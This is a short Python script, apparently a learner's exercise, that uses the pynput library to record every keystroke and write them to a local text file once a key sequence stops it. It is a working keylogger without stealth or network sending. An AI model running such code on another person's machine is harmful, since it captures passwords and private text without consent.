from pynput import keyboard

words = []
terminate = False


def on_key_press(key):
    try:
        words.append(key.char)
    except AttributeError:
        words.append(str(key))


def on_key_release(key):
    global terminate
    if key == keyboard.Key.shift and terminate:
        terminate = False
    elif key == keyboard.KeyCode.from_char('Q') and not terminate:
        terminate = True
    elif terminate:
        return False


with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open("keyboard_entries.txt", "w") as dosya:
    dosya.write("".join(words))
